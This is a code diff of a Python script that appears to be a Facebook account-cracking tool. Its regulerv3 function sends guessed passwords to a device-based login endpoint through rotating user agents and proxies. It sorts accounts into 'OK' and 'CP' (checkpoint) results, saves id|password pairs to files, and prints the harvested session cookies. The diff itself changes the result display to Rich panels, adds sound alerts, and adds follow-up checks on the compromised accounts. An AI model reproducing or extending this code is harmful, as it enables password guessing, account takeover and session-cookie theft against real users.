@@ -1337,7 +1337,7 @@ def regulerv3(idf,pwv,url):
 	AinkRaka = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
 	prog.update(des,description=f'\r[bold white]Reguler V3[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
-	ua = random.choice(free)
+	ua = random.choice(raka)
 	#ua = random.choice(free)
 	ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 	ses = requests.Session()
@@ -1385,16 +1385,27 @@ def regulerv3(idf,pwv,url):
 			"x-response-format": "JSONStream"}		
 			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print(f' {P}[{K}Rudal CP{P}] {K}{idf}|{pw}')
-				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				akun.append(idf+'|'+pw)
 				cp+=1
+				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{K2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio c.mp3')
+				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
+				ceker(idf,pwv)
+				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f' {P}[{H}Rudal OK{P}] {H}{idf}|{pw}\n{kuki}')
+				tree = Tree(Panel.fit(f"""{H2}{idf}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
+				tree.add(Panel.fit(f"{H2}{cektahun(idf)}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{ua}{P2}",style=f"{color_panel}"))
+				tree.add(Panel(f"{H2}{kuki}{P2}",style=f"{color_panel}"))
+				prints(tree)
+				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
+				cek_apk(kuki)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
